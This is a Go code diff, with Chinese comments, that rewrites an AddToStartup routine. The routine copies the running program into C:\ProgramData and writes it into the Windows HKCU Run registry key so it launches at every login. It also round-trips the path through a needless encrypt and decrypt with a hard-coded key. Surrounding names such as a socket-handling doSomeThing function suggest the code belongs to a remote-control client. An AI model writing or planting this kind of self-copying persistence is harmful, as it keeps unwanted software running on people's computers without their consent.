@@ -10,6 +10,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"sync"
@@ -163,32 +164,29 @@ func doSomeThing(socket net.Conn) {
 }
 
 func AddToStartup() {
-
-	// 获取程序的绝对路径
-	path, err := os.Executable()
-	if err != nil {
-		log.Fatal(err)
-	}
+	//复制程序到指定目录
+	util.CopyToProgramData()
+	exePath := filepath.Join("C:\\ProgramData", filepath.Base(os.Args[0]))
+	exeName := filepath.Base(exePath)
 
 	// 打开注册表项
-	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	key, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer key.Close()
 
 	// 检查是否已存在该项
-	_, _, err = key.GetStringValue("MyProgram")
+	_, _, err = key.GetStringValue(exeName)
 	if err == nil {
 		// 如果已存在，则不需要重复写入
 		return
 	}
-	// 创建一个 AES 加密算法实例
-	encryptString, err := util.EncryptString("ylcworld", path)
+	encryptPath, err := util.EncryptString("ylcworld", exePath)
 
 	// 写入注册表项
-	decryptString, err := util.DecryptString("ylcworld", encryptString)
-	err = key.SetStringValue("MyProgram", decryptString)
+	decryptPath, err := util.DecryptString("ylcworld", encryptPath)
+	err = key.SetExpandStringValue(exeName, decryptPath)
 	if err != nil {
 		log.Fatal(err)
 	}
